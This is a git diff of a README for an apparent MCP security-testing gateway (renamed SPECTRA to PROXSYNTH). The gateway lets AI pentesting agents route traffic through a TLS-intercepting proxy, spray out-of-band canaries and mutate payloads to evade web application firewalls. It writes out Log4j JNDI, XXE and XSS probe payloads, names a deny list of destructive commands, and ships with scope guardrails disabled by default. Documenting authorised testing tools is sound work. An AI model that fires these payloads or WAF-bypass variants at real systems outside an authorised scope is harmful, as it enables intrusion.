@@ -1,53 +1,68 @@
-# 🛡️ SPECTRA // Security Testing Gateway & Observability Platform
-### Next-Generation Model Context Protocol (MCP) Intercept Proxy, Security Gateway & Live Telemetry Console for Autonomous AI Pentesting Agents
+# ⚡ PROXSYNTH // Autonomous Security Testing Gateway & Interception Platform
+### Next-Generation Model Context Protocol (MCP) Intercept Proxy, Out-Of-Band Canary Engine, Token Distiller & Attack Hypothesis Ledger for Autonomous AI Red Teaming Agents
 
 [![Python](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://python.org)
 [![MCP](https://img.shields.io/badge/Model%20Context%20Protocol-FastMCP%201.0%2B-purple.svg)](https://modelcontextprotocol.io)
+[![FastMCP Tools](https://img.shields.io/badge/FastMCP%20Tools-37%20Registered-8b5cf6.svg)](#-complete-mcp-tools-reference-specification-37-tools)
 [![FastAPI](https://img.shields.io/badge/FastAPI-High%20Performance-009688.svg)](https://fastapi.tiangolo.com)
-[![Playwright](https://img.shields.io/badge/Playwright-Chromium%20Automation-45ba4b.svg)](https://playwright.dev)
+[![Playwright](https://img.shields.io/badge/Playwright-Chromium%20DOM%20Oracle-45ba4b.svg)](https://playwright.dev)
 [![Database](https://img.shields.io/badge/SQLite-WAL%20Engine-003B57.svg)](https://sqlite.org)
-[![Forward Proxy](https://img.shields.io/badge/Forward%20Proxy-Port%208088-0ea5e9.svg)](#built-in-forward-interception-proxy)
-[![TLS MITM](https://img.shields.io/badge/TLS%20MITM-Decryption%20Engine-ef4444.svg)](#tls-mitm-decryption-engine)
-[![Auto-Enforcement](https://img.shields.io/badge/Auto--Enforcement-sitecustomize.py-8b5cf6.svg)](#transparent-runtime-auto-enforcement-sitecustomizepy)
+[![Forward Proxy](https://img.shields.io/badge/Forward%20Proxy-Port%208088-0ea5e9.svg)](#-built-in-forward-interception-proxy--tls-mitm-decryption-engine)
+[![TLS MITM](https://img.shields.io/badge/TLS%20MITM-Decryption%20Engine-ef4444.svg)](#-built-in-forward-interception-proxy--tls-mitm-decryption-engine)
+[![Auto-Enforcement](https://img.shields.io/badge/Auto--Enforcement-sitecustomize.py-8b5cf6.svg)](#-transparent-runtime-auto-enforcement-sitecustomizepy)
 [![Zero Guardrails](https://img.shields.io/badge/Guardrails-Opt--in%20Defaults-22c55e.svg)](#phase-1-target-scope--guardrail-setup-zero-default-guardrails)
-[![OAST](https://img.shields.io/badge/OAST%20Engine-Out--of--Band%20Callbacks-f97316.svg)](#oast-engine-out-of-band-security-testing)
-[![Target Graph](https://img.shields.io/badge/Attack%20Surface-Knowledge%20Graph-06b6d4.svg)](#target-knowledge-graph)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](#license)
+[![OAST](https://img.shields.io/badge/OAST%20Engine-HTTP%20%7C%20DNS%20%7C%20LDAP-f97316.svg)](#pillar-2-p2-autonomous-multi-protocol-oast-canary-sprayer)
+[![Hypothesis Ledger](https://img.shields.io/badge/Working%20Memory-Hypothesis%20Ledger-ec4899.svg)](#pillar-3-p3-agent-working-memory--attack-hypothesis-ledger)
+[![DOM Oracle](https://img.shields.io/badge/DOM%20Oracle-Headless%20Sandbox-10b981.svg)](#pillar-4-p4-browser-dom-execution-oracle-sandbox)
+[![License](https://img.shields.io/badge/License-MIT-green.svg)](#-license)
+
+---
+
+```
+  ██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗██╗   ██╗███╗   ██╗████████╗██╗  ██╗
+  ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝██╔════╝╚██╗ ██╔╝████╗  ██║╚══██╔══╝██║  ██║
+  ██████╔╝██████╔╝██║   ██║ ╚███╔╝ ███████╗ ╚████╔╝ ██╔██╗ ██║   ██║   ███████║
+  ██╔═══╝ ██╔══██╗██║   ██║ ██╔██╗ ╚════██║  ╚██╔╝  ██║╚██╗██║   ██║   ██╔══██║
+  ██║     ██║  ██║╚██████╔╝██╔╝ ██╗███████║   ██║   ██║ ╚████║   ██║   ██║  ██║
+  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝
+     ── THE AUTONOMOUS INTERCEPTION PROXY & AGENTIC SECURITY GATEWAY ──
+```
 
 ---
 
 ## 📌 Executive Overview
 
-**SPECTRA** is an enterprise-grade security testing gateway, transparent interception proxy, and real-time observability platform engineered specifically for **Autonomous AI Pentesting Agents** (such as **OpenCode**, **Hermes Agent**, **Claude Code**, **Cursor**, **Windsurf**, or custom LLM security workflows communicating via the **Model Context Protocol (MCP)**).
+**PROXSYNTH** is an enterprise-grade security testing gateway, transparent interception proxy, and real-time observability platform engineered specifically for **Autonomous AI Pentesting Agents** (such as **Claude Code**, **Cursor**, **OpenCode**, **Hermes Agent**, **Windsurf**, or custom LLM security workflows communicating via the **Model Context Protocol (MCP)**).
 
-When deploying autonomous AI agents against web applications, cloud APIs, and internal networks, security operators encounter critical operational hurdles:
+When deploying autonomous AI agents against web applications, cloud APIs, and internal networks, security operators encounter critical operational hurdles that make traditional interception proxies (*Burp Suite*, *Caido*, *mitmproxy*, *OWASP ZAP*) unworkable:
 
-1. **Credential Amnesia & Hallucinated Logins:** Agents lose session cookies across loops, hallucinate expired credentials, or repeatedly interrupt human operators with authentication requests.
-2. **The "Subprocess Scripting Gap & Proxy Evading":** When agents generate standalone exploit scripts (e.g., Python `requests`/`httpx`, `curl`, `sqlmap`, `ffuf`, `nuclei`) or execute scripts directly in host terminal/bash, outbound HTTP/HTTPS traffic bypasses proxy listeners, TLS CONNECT tunnels produce blind uninspected noise, and scope boundaries are evaded.
-3. **Ephemeral Attack Surface & Recon Blindness:** Agents lack a persistent, structured understanding of discovered assets, exposed ports, and tested vs. untested endpoints, leading to redundant scans and forgotten attack vectors.
-4. **Blind Vulnerability Invisibility:** Exploiting Blind SSRF, Blind SQL Injection, Out-of-Band XXE, or Log4j/JNDI callbacks is impossible without an integrated listener that correlates callback hits directly to the originating test request.
-5. **Token Exhaustion during Fuzzing:** Inspecting large raw HTTP responses inside the LLM context window exhausts token limits and increases inference costs exponentially.
-6. **Lack of Human-in-the-Loop (HITL) Interception:** Operators cannot pause, inspect, modify, or drop high-risk agent requests before they hit production servers.
-7. **Siloed Tooling & Reporting:** Agent interactions remain locked in chat transcripts instead of generating industry-standard security deliverables (**HAR 1.2**, **Burp Suite** archives, **Executive Pentest Reports**, **OpenAPI 3.0 Specs**).
+1. **The "Subprocess Scripting Gap & Proxy Evading":** When agents generate standalone exploit scripts (Python `requests`/`httpx`, `curl`, `sqlmap`, `ffuf`, `nuclei`) or execute scripts directly in host terminal/bash, outbound HTTP/HTTPS traffic bypasses proxy listeners, TLS CONNECT tunnels produce blind uninspected noise, and scope boundaries are evaded.
+2. **Agent Amnesia & Context Drift:** Autonomous LLM loops suffer from context loss between execution steps. Without persistent structured working memory, agents repeat redundant tests, lose track of verified attack paths, and hallucinate testing conclusions.
+3. **Context Window Token Exhaustion:** Feeding raw HTTP response bodies (often 100KB–1MB with HTML layout, inline CSS, SVG paths, and base64 assets) into LLM context windows causes immediate token limit blowouts, sluggish inference, and massive API costs.
+4. **Blind Vulnerability Invisibility:** Exploiting Blind SSRF, Blind SQL Injection, Out-of-Band XXE, or Log4j/JNDI callbacks is impossible without an integrated multi-protocol listener that correlates callback hits directly to the originating test request.
+5. **False Positive Hallucinated XSS:** LLMs frequently guess whether `<script>alert(1)</script>` fired based purely on reflection in raw HTML, producing hallucinated findings on sanitized or non-executing sinks.
+6. **Credential Amnesia & Hallucinated Logins:** Agents lose session cookies across loops, hallucinate expired credentials, or repeatedly interrupt human operators with authentication requests.
+7. **Lack of Human-in-the-Loop (HITL) Interception:** Operators cannot pause, inspect, modify, or drop high-risk agent requests before they hit production servers.
+8. **Siloed Tooling & Reporting:** Agent interactions remain locked in chat transcripts instead of generating industry-standard security deliverables (**HAR 1.2**, **Burp Suite** archives, **Executive Pentest Reports**, **OpenAPI 3.0 Specs**).
 
-**SPECTRA solves every single one of these challenges.** Operating as an intelligent, bidirectional gateway between your AI Agent and the target application, SPECTRA provides **transparent forward proxy auto-injection**, **runtime Python auto-enforcement (`sitecustomize.py`)**, **TLS MITM decryption engine with dynamic CA generation**, **stateful attack surface mapping**, **out-of-band callback listening**, **zero-prompt credential injection**, **token-saving differential analysis**, and a **high-density cyberpunk SOC dashboard**.
+**PROXSYNTH solves every single one of these challenges.** Operating as an intelligent, bidirectional gateway between your AI Agent and the target application, PROXSYNTH provides **transparent forward proxy auto-injection**, **runtime Python auto-enforcement (`sitecustomize.py`)**, **TLS MITM decryption engine with dynamic CA generation**, **stateful attack surface mapping**, **autonomous multi-protocol out-of-band callback listening**, **agent working memory hypothesis ledger**, **LLM semantic body distillation**, **deterministic headless DOM execution verification**, and a **high-density cyberpunk SOC dashboard**.
 
 ---
 
 ## 🏗️ System Architecture Design
 
-SPECTRA isolates agent reasoning and LLM API traffic from target security testing traffic while aggregating telemetry into a unified operator console.
+PROXSYNTH isolates agent reasoning and LLM API traffic from target security testing traffic while aggregating telemetry into a unified operator console.
 
 ### 1. High-Level Architectural Diagram
 
 ```
                                   ┌────────────────────────────────────────────────────────┐
                                   │            AUTONOMOUS AI PENTESTING AGENTS             │
-                                  │       (OpenCode / Hermes Agent / Claude / Cursor)      │
+                                  │      (Claude Code / Cursor / OpenCode / Hermes)        │
                                   └───────────────┬────────────────────────┬───────────────┘
                                                   │                        │
-                   Direct MCP Tools (JSON-RPC)    │                        │ Subprocess / Host Script Execution
-            (send_http_request, render_webpage)   │                        │ (run_pentest_command OR host terminal)
+                   Direct FastMCP Tools (JSON-RPC)│                        │ Subprocess / Host Script Execution
+             (send_http_request, render_webpage)  │                        │ (run_pentest_command OR host terminal)
                                                   │                        │
                                                   │                        ▼
                                                   │         ┌──────────────────────────────────────────────┐
@@ -55,23 +70,25 @@ SPECTRA isolates agent reasoning and LLM API traffic from target security testin
                                                   │         │  - sitecustomize.py (Auto-loaded by Python)  │
                                                   │         │  - Workspace .env & Shell Envs Injected      │
                                                   │         │  - Auto-routes requests / httpx to :8088     │
-                                                  │         │  - Auto-trusts .spectra_ca/spectra_ca.crt    │
+                                                  │         │  - Auto-trusts .proxynth_ca/proxynth_ca.crt  │
                                                   │         └──────────────────────┬───────────────────────┘
                                                   ▼                                │
 ┌──────────────────────────────────────────────────────────────────────────────────┼───────────────────────────────────────┐
-│                                                   SPECTRA MCP GATEWAY            │                                       │
+│                                                   PROXSYNTH MCP GATEWAY          │                                       │
 │                                                     (mcp_server.py)              │                                       │
 │                                                                                  │                                       │
 │   ┌──────────────────────────────────────────────┐                               │                                       │
 │   │            MCP Tool Boundary (Stdio)         │                               │                                       │
-│   │  - send_http_request (JSON/Diff mode)        │                               │                                       │
-│   │  - browser_navigate_and_render (Playwright)  │                               │                                       │
-│   │  - record_test_payload / report_finding      │                               │                                       │
+│   │  - 37 Registered FastMCP Tools               │                               │                                       │
+│   │  - P1: distill_http_response                 │                               │                                       │
+│   │  - P2: spray_oast_canaries                   │                               │                                       │
+│   │  - P3: record_hypothesis / get_agenda        │                               │                                       │
+│   │  - P4: verify_dom_execution (Playwright)     │                               │                                       │
 │   └──────────────────────┬───────────────────────┘                               │                                       │
 │                          │                                                       │                                       │
 │                          ▼                                                       ▼                                       │
 │   ┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐   │
-│   │                                       SPECTRA SECURITY & INTERCEPTION CORE                                       │   │
+│   │                                       PROXSYNTH SECURITY & INTERCEPTION CORE                                     │   │
 │   │                                                                                                                  │   │
 │   │   [Built-in Forward Proxy :8088] ──> [TLS MITM Decryption Engine (Dynamic CA Certificate Generation)]            │   │
 │   │                                                                                                                  │   │
@@ -92,16 +109,18 @@ SPECTRA isolates agent reasoning and LLM API traffic from target security testin
                   │ Outbound Security Traffic                                        │ Outbound Script Traffic (requests, curl, sqlmap)
                   ▼                                                                  ▼
         ┌──────────────────┐                                               ┌──────────────────┐
-        │  TARGET WEB APP  │                                               │ OAST CALLBACKS   │
-        │  & REST / GRAPHQL│                                               │ (:8000/oast/*)   │
-        └─────────┬────────┘                                               └─────────┬────────┘
+        │  TARGET WEB APP  │                                               │ OAST LISTENERS   │
+        │  & REST / GRAPHQL│                                               │ - HTTP :8000     │
+        └─────────┬────────┘                                               │ - DNS UDP :5354  │
+                  │                                                        │ - LDAP TCP :1390 │
+                  │                                                        └─────────┬────────┘
                   │                                                                  │
                   └───────────────────────────────┬──────────────────────────────────┘
                                                   │
                                                   │ Real-Time WebSocket Telemetry & WAL Database
                                                   ▼
                                 ┌──────────────────────────────────┐
-                                │       FASTAPI CORE ENGINE        │
+                                │      FASTAPI ENGINE (APP.PY)     │
                                 │   (:8000 or custom port :8081)   │
                                 └─────────────────┬────────────────┘
                                                   │
@@ -109,30 +128,30 @@ SPECTRA isolates agent reasoning and LLM API traffic from target security testin
                                 ┌──────────────────────────────────┐
                                 │       OPERATOR SOC CONSOLE       │
                                 │  - Live Proxy Traffic Table      │
-                                │  - Forward Proxy Status (:8088)  │
-                                │  - Target Knowledge Graph (Map)  │
-                                │  - OAST Interaction Console      │
                                 │  - Interactive Intercept Trap    │
-                                │  - AI Command Execution Audit    │
-                                │  - Payload Vault & Matrix        │
-                                │  - Differential Analysis Diff    │
+                                │  - Target Attack Surface Graph   │
+                                │  - OAST Interaction Console      │
+                                │  - Attack Hypothesis Ledger (P3) │
+                                │  - Vulnerability Findings Ledger │
+                                │  - AI Command Audit Trail        │
+                                │  - Repeater & Parameter Fuzzer   │
                                 │  - HAR 1.2 / Markdown Exporter   │
                                 └──────────────────────────────────┘
 ```
 
 ---
 
-### 2. Core Architectural Subsystems
+### 2. Core Architectural Subsystems Flowchart
 
 ```mermaid
 flowchart TD
     subgraph AgentWorkspace["AI Agent Testing Layer"]
-        A[Autonomous Agent: OpenCode / Hermes] -->|Direct MCP Tool| B[MCP FastMCP Handler]
+        A[Autonomous Agent: Claude Code / Cursor / OpenCode] -->|Direct FastMCP Tool| B[MCP FastMCP Handler: 37 Tools]
         A -->|run_pentest_command OR Host Terminal| C[Python Scripts / curl / sqlmap]
         C -->|sitecustomize.py & .env| C1[Auto-Proxy & CA Auto-Trust Injection]
     end
 
-    subgraph ProxyInterception["Spectra Gateway & Proxy Layer"]
+    subgraph ProxyInterception["Proxynth Gateway & Proxy Layer"]
         C1 -->|HTTP & HTTPS CONNECT| D[Built-in Forward Proxy :8088]
         D -->|HTTPS Traffic| D1[TLS MITM Decryption Engine]
         D1 -->|Dynamic Host Cert Generated| D2[Decrypted HTTP Request Parsed]
@@ -141,7 +160,7 @@ flowchart TD
         D -->|Plain HTTP| E
         E -- "Guardrail Enabled & Out of Scope" --> E1[Reject: HTTP 403 Forbidden]
         E -- "Disabled (Default) OR In Scope" --> F{Anti-Loopback Check}
-        F -- "Points to Spectra Ports" --> F1[Block Recursive Self-Loop]
+        F -- "Points to Proxynth Ports" --> F1[Block Recursive Self-Loop]
         F -- "Target Host Allowed" --> G{HITL Intercept Active?}
         G -- "Yes" --> G1[Pause & Trap Request in Memory]
         G1 --> G2{Operator Decision}
@@ -155,61 +174,206 @@ flowchart TD
         J --> M[SQLite WAL Storage & WS Broadcast]
     end
 
-    subgraph OastSubsystem["OAST Engine"]
-        O1[Target Out-of-Band Interaction] -->|HTTP Callback| O2[OAST Listener /oast/TOKEN/*]
+    subgraph AdvancedPillars["Advanced AI Agent Pillars (P1 - P4)"]
+        J --> P1[P1: Semantic Body Distiller]
+        P1 -->|85-95% Token Reduction| B
+        B --> P2[P2: OAST Canary Sprayer]
+        P2 -->|HTTP / DNS / LDAP Canaries| I
+        B --> P3[P3: Hypothesis Ledger]
+        P3 -->|Persistent Memory State| DB[(SQLite WAL Database)]
+        B --> P4[P4: Headless DOM Oracle]
+        P4 -->|Deterministic Alert Hook| J
+    end
+
+    subgraph OastSubsystem["Multi-Protocol OAST Engine"]
+        O1[Target Out-of-Band Callback] -->|HTTP / DNS :5354 / LDAP :1390| O2[OAST Listeners]
         O2 --> O3[Correlate Token & Dispatch WebSocket OAST_HIT]
     end
 
     subgraph OperatorConsole["Operator SOC Dashboard"]
         M --> UI1[Live Traffic Table & Inspector]
         M --> UI2[Target Attack Surface Graph]
-        M --> UI3[Command Audit & Payload Vault]
-        O3 --> UI4[OAST Event Feed]
-        G1 -.->|Live Notification| UI5[Interactive Intercept Modal]
-        UI5 -.-> G2
+        M --> UI3[Hypothesis Ledger Tab]
+        M --> UI4[Command Audit & Payload Vault]
+        O3 --> UI5[OAST Event Feed]
+        G1 -.->|Live Notification| UI6[Interactive Intercept Modal]
+        UI6 -.-> G2
     end
 ```
 
 ---
 
-## ⚡ Key Capabilities & Innovations
+## ⚡ The 4 Advanced Agentic Pillars (P1 – P4)
 
-| Subsystem | Technical Implementation | Operational Benefit |
-| :--- | :--- | :--- |
-| **Built-in Forward Proxy & TLS MITM Engine** | High-performance `asyncio` proxy engine listening on port `8088` with dynamic self-signed root CA certificate generator (`.spectra_ca/spectra_ca.crt`). Unwraps HTTPS CONNECT tunnels, decrypts full HTTP requests/responses, and suppresses blind tunnel noise. | Solves the scripting gap: Python scripts (`requests`, `httpx`), `curl`, and `sqlmap` are captured, decrypted, audited, and triaged automatically with full URL paths, headers, and request bodies visible in the dashboard. |
-| **Transparent Runtime Auto-Enforcement** | Python runtime hook (`sitecustomize.py`) installed in workspace root and virtualenv `site-packages`, backed by workspace `.env`. Automatically configures `HTTP_PROXY`, `HTTPS_PROXY`, `REQUESTS_CA_BUNDLE`, `SSL_CERT_FILE`, and runtime session monkeypatching. | Even if an AI Agent writes custom Python scripts and runs them directly in host bash/terminal without using `run_pentest_command` or specifying `--proxy`, all outbound traffic is routed through Spectra seamlessly with zero code modifications. |
-| **Zero Default Guardrails (Opt-in Policy)** | All projects initialize with `scope_enabled=False`, `allow_internal_networks=True`, `allowed_hosts=["*"]`, and `blocked_patterns=[]`. Scope protection is purely opt-in via dashboard toggle. | Eliminates initial configuration hurdles. Local penetration testing labs (`127.0.0.1`, `localhost`), Docker containers, private RFC1918 subnets, and external domains work instantly out of the box. |
-| **Target Knowledge Graph** | Relational graph schema (`Asset -> Service -> Endpoint`) with testing state tracking (`UNTESTED`, `IN_PROGRESS`, `TESTED_CLEAN`, `TESTED_VULNERABLE`). | Provides persistent memory of target architecture so agents never lose recon context or re-scan already vetted routes. |
-| **OAST Engine** | Unique token correlation engine catching HTTP callbacks on `/oast/{token}/*` with real-time WebSocket broadcasting. | Enables autonomous detection and human verification of Blind SSRF, Blind SQLi, Out-of-Band XXE, and Log4j/JNDI exploits. |
-| **Differential Baseline Analysis** | Context-efficient unified diff engine (`diff_baseline_id`) comparing mutant responses against baseline requests. | Reduces token consumption by up to 90% during fuzzing and payload mutation loops, drastically cutting LLM inference costs. |
-| **Structured JSON Outputs** | Dual output mode (`output_format="json"`) on all HTTP and terminal execution tools. | Provides deterministic, machine-readable JSON payloads for AI agents while preserving human-readable text fallbacks. |
-| **Zero-Prompt Auth Injection** | Domain-indexed credential engine storing session cookies and tokens with Fernet authenticated encryption. | Agents never lose session state, never hallucinate tokens, and never interrupt operators for repeated logins. |
-| **CLI Safe-Mode & Audit Trail** | Pre-execution regex guardrail blocking destructive patterns (`rm -rf`, `DROP DATABASE`, fork bombs) with persistent stdout/stderr audit. | Prevents catastrophic host system damage while providing complete transparency over every terminal command executed. |
-| **Interactive Intercept (Trap)** | In-memory request trap pausing agent execution and alerting the dashboard via WebSockets. | Full Burp Suite-style Human-in-the-Loop control: inspect, modify parameters on the fly, or drop malicious payloads before dispatch. |
-| **Dual-Track Vulnerability Triage** | Automated heuristics engine classifying findings into **CONFIRMED** (deterministic error signatures, leaked tokens) vs **POTENTIAL** (anomalous 500s, timing deltas). | Eliminates vulnerability alert fatigue by separating confirmed exploit evidence from probabilistic anomalies. |
-| **Headless SPA Engine** | Playwright Chromium automation capturing DOM structures and background asynchronous AJAX/Fetch requests. | Full penetration testing capabilities against modern JavaScript single-page applications (React, Next.js, Vue, Angular). |
-| **Enterprise Standards Export** | 1-Click export to **HAR 1.2**, **Executive Markdown Report**, and **OpenAPI 3.0 / Swagger**. | Seamless interoperability with Burp Suite, OWASP ZAP, Caido, Postman, and client audit reporting. |
+PROXSYNTH introduces four cutting-edge subsystems specifically designed to elevate AI agents from blind brute-force scripts into disciplined, cognitive offensive security operators.
 
 ---
 
-## 🚀 Installation & Prerequisites
+### Pillar 1 (P1): LLM Semantic Response Body Distiller
+* **The Problem:** LLM context windows are easily choked by 200KB–1MB raw HTML responses packed with inline SVG icons, Tailwind CSS classes, base64 data URIs, and third-party tracking scripts.
+* **The Solution:** Built-in semantic parser ([`backend/body_distiller.py`](file:///d:/PROJECT/01/backend/body_distiller.py)) that strips layout noise while extracting essential attack-surface intelligence:
+  - Form actions, input fields, methods, hidden tokens.
+  - REST/GraphQL endpoints, script sources, JSON keys.
+  - Reflected parameters and sensitive token strings (`api_key`, `token`, `secret`, `jwt`).
+* **Performance:** Achieves **85% to 95% token reduction** with zero critical information loss.
+* **MCP Integration:** Tool 32 `distill_http_response` and `send_http_request(distill_response=True)`.
+
+```json
+// Example Distilled Output for LLM Consumption
+{
+  "title": "Account Settings - Target Portal",
+  "forms": [
+    {"action": "/api/v1/profile/update", "method": "POST", "inputs": [{"name": "email", "type": "text"}, {"name": "csrf_token", "type": "hidden"}]}
+  ],
+  "api_endpoints": ["/api/v1/profile/update", "/api/v1/billing/invoices"],
+  "stats": {"original_bytes": 142500, "distilled_bytes": 1850, "token_reduction_pct": 98.7}
+}
+```
+
+---
+
+### Pillar 2 (P2): Autonomous Multi-Protocol OAST Canary Sprayer
+* **The Problem:** Blind SSRF, Blind SQL Injection, Out-of-Band XXE, and Log4j (JNDI) vulnerabilities produce zero reflection in HTTP response bodies. Agents test blindly and miss critical flaws.
+* **The Solution:** Autonomous sprayer ([`backend/oast_sprayer.py`](file:///d:/PROJECT/01/backend/oast_sprayer.py)) that crawls URL parameters, headers, or body values and sprays multi-protocol canaries across four vectors simultaneously:
+  1. **HTTP Callback:** `http://127.0.0.1:8000/oast/<token>/payload`
+  2. **DNS Callback (UDP :5354):** `<token>.oast.proxynth.local`
+  3. **LDAP/JNDI Callback (TCP :1390):** `${jndi:ldap://127.0.0.1:1390/<token>}`
+  4. **XXE Out-of-Band Entity:** `<!ENTITY % dtd SYSTEM "http://127.0.0.1:8000/oast/<token>/xxe">`
+* **MCP Integration:** Tool 33 `spray_oast_canaries(target_url="https://target/api", vuln_types=["ssrf", "dns", "log4j", "xxe"])`.
+
+---
+
+### Pillar 3 (P3): Agent Working Memory & Attack Hypothesis Ledger
+* **The Problem:** AI agents operate statelessly between user prompts. They forget what was tested, repeat redundant exploits, and fail to track the progression of a multi-stage attack.
+* **The Solution:** Stateful Hypothesis Ledger ([`backend/hypothesis_manager.py`](file:///d:/PROJECT/01/backend/hypothesis_manager.py) + SQLite model `TestingHypothesis`) tracking testing lifecycle states:
+  - `PLANNED` ➔ `TESTING` ➔ `CONFIRMED` | `DISPROVEN` | `BLOCKED`
+* **Autonomous Agenda Calculation:** `get_testing_agenda` synthesizes pending attack avenues and prevents looping.
+* **Real-Time Synchronized UI:** Dedicated "Hypothesis Ledger" dashboard tab featuring metric cards, status filters, and live WebSocket broadcasts (`HYPOTHESIS_CREATED`, `HYPOTHESIS_UPDATED`, `HYPOTHESIS_DELETED`).
+* **MCP Integration:** Tools 34–36 (`record_testing_hypothesis`, `get_testing_agenda`, `update_hypothesis_status`).
+
+---
+
+### Pillar 4 (P4): Browser DOM Execution Oracle Sandbox
+* **The Problem:** LLMs guess whether an XSS payload executed by searching for the reflected string in the response body. This produces rampant false positives in attribute contexts, encoded blocks, or sanitization sinks.
+* **The Solution:** Sandboxed headless Playwright Chromium oracle ([`backend/browser_oracle.py`](file:///d:/PROJECT/01/backend/browser_oracle.py)) that renders the target URL with the payload and hooks:
+  - `window.alert`, `window.confirm`, `window.prompt` dialogs.
+  - Page console logs and unhandled error events.
+  - Dynamic DOM script elements and sink mutations.
+* **Deterministic Verdict:** Returns `CONFIRMED_DOM_EXECUTION` with exact dialog message and URL context, or `NO_DOM_EXECUTION`.
+* **MCP Integration:** Tool 37 `verify_dom_execution(url="https://target/search", payload="<script>alert(1)</script>")`.
+
+---
+
+## 🧰 Complete MCP Tools Reference Specification (37 Tools)
+
+PROXSYNTH's FastMCP server (`mcp_server.py`) registers **37 enterprise-grade offensive security tools**:
+
+| # | Tool Name | Subsystem / Pillar | Primary Operational Capability |
+| :---: | :--- | :--- | :--- |
+| **1** | `send_http_request` | Core Network | High-performance HTTP/HTTPS dispatcher with auto-auth injection, scope checks, intercept trap, and response body distillation (`distill_response=True`). |
+| **2** | `get_log_detail` | Telemetry & History | Retrieves full un-truncated HTTP request/response headers and bodies by Log ID. |
+| **3** | `get_traffic_history` | Telemetry & History | Lists recent HTTP transactions with status codes, latency, and triage tags. |
+| **4** | `browser_navigate_and_render` | Browser Automation | Headless Playwright engine capturing dynamic DOM and network Fetch/XHR calls. |
+| **5** | `request_manual_login` | Authentication | Spawns visible browser for human operator to solve CAPTCHA/2FA; auto-imports session cookies. |
+| **6** | `get_attack_surface` | Attack Surface | Returns hierarchical topology graph of assets, open ports, and endpoints. |
+| **7** | `record_target_asset` | Reconnaissance | Explicitly catalogs a host/machine, IP address, OS, and status in the knowledge graph. |
+| **8** | `record_target_service` | Reconnaissance | Records open ports, protocols (TCP/UDP), and service banners for a target asset. |
+| **9** | `record_target_endpoint` | Reconnaissance | Catalogs target URL routes, parameters, auth requirements, and testing status (`UNTESTED`, `TESTED_VULNERABLE`). |
+| **10** | `generate_oast_token` | OAST Engine | Generates unique correlation token and callback URLs for Out-of-Band testing. |
+| **11** | `poll_oast_events` | OAST Engine | Queries captured callbacks (HTTP, DNS, LDAP) for a specific OAST token. |
+| **12** | `record_test_payload` | Payload Vault | Stores exploit strings into the Payload Vault with categorization and tags. |
+| **13** | `report_vulnerability` | Findings & Audit | Flags an HTTP log entry as a confirmed vulnerability finding in the operator ledger. |
+| **14** | `run_pentest_command` | Subprocess Execution | Executes terminal commands (`curl`, `sqlmap`, `nuclei`) with auto-proxy routing to `:8088` and audit logging. |
+| **15** | `set_identity_session` | BOLA / IDOR Matrix | Registers secondary user identity cookies (e.g., attacker/victim) for shadow replay testing. |
+| **16** | `test_bola_idor` | BOLA / IDOR Matrix | Executes dual-track BOLA replay against an endpoint using registered identity roles. |
+| **17** | `analyze_waf_response` | WAF Evasion | Fingerprints target WAF vendor (Cloudflare, AWS WAF, Akamai) and recommends bypass tactics. |
+| **18** | `mutate_payload` | WAF Evasion | Generates obfuscated payload variations (URL, hex, comment injection, Unicode bypass). |
+| **19** | `infer_hidden_endpoints` | API Reconstructor | Predicts unmapped REST endpoints (admin, actuator, docs, CRUD variants) from observed paths. |
+| **20** | `get_attack_paths` | Attack Chains | Synthesizes Kill Chain attack paths from initial recon to Crown Jewels (RCE, DB dump). |
+| **21** | `generate_exploit_poc` | PoC Generator | Generates standalone Python PoC scripts, cURL commands, and CVSS/CWE dossiers for findings. |
+| **22** | `send_websocket_message` | WebSocket Audit | Transmits and logs WebSocket frames to target socket endpoints for real-time protocol testing. |
+| **23** | `fuzz_endpoint` | Parameter Fuzzer | High-speed dictionary fuzzing against marker positions (`§...§`) with status and length delta analysis. |
+| **24** | `execute_workflow_sequence` | Business Logic | Executes multi-step stateful workflows with dynamic variable extraction and step-skipping bypass checks. |
+| **25** | `test_race_condition` | Concurrency Burst | Executes microsecond-synchronized request bursts using `asyncio.Barrier` to detect double-spending. |
+| **26** | `mine_javascript_assets` | JS Recon | Scrapes frontend `.js` bundles for hidden API routes, query params, source maps, and leaked API secrets. |
+| **27** | `compare_http_responses` | Diff Engine | Normalizes dynamic noise (timestamps, UUIDs, CSRF nonces) to detect Soft-403/404 anomalies. |
+| **28** | `audit_jwt_security` | JWT Security | Audits JWT tokens for Algorithm None bypass, weak HMAC offline brute-forcing, and claim tampering. |
+| **29** | `delete_attack_surface_node` | Attack Surface | Prunes stale or false-positive assets, services, or endpoints from the knowledge graph. |
+| **30** | `clear_attack_surface_graph` | Attack Surface | Wipes all attack surface records for a project workspace to reset reconnaissance. |
+| **31** | `get_intercept_status` | HITL Intercept | Checks whether the human-in-the-loop intercept trap is active and returns pending trapped requests. |
+| **32** | `distill_http_response` | **P1: Distiller** | Compresses HTML/JSON bodies into semantic security structures, achieving 85–95% token savings. |
+| **33** | `spray_oast_canaries` | **P2: OAST Sprayer** | Discovers input parameters and sprays multi-protocol canaries (HTTP, DNS, LDAP/JNDI, XXE) across a target URL. |
+| **34** | `record_testing_hypothesis` | **P3: Memory** | Logs an attack hypothesis into the stateful ledger (`target`, `vuln_type`, `hypothesis`, `parameters`). |
+| **35** | `get_testing_agenda` | **P3: Memory** | Synthesizes an actionable testing agenda of unverified hypotheses to eliminate agent loops. |
+| **36** | `update_hypothesis_status` | **P3: Memory** | Transitions hypothesis lifecycle state (`PLANNED` ➔ `TESTING` ➔ `CONFIRMED` / `DISPROVEN` / `BLOCKED`). |
+| **37** | `verify_dom_execution` | **P4: DOM Oracle** | Executes payload in sandboxed Playwright Chromium to deterministically verify XSS/DOM sinks. |
+
+---
+
+## 🥊 Head-to-Head Comparison: Why AI Agents Need Proxynth
+
+Traditional interception proxies were built for human eyes and manual clicks. When autonomous AI agents use them, critical architectural failures emerge:
+
+| Feature / Capability | PROXSYNTH | Burp Suite Professional | Caido | mitmproxy | OWASP ZAP |
+| :--- | :---: | :---: | :---: | :---: | :---: |
+| **Native Model Context Protocol (FastMCP)** | ✅ **Yes (37 Tools)** | ❌ No | ❌ No | ❌ No | ❌ No |
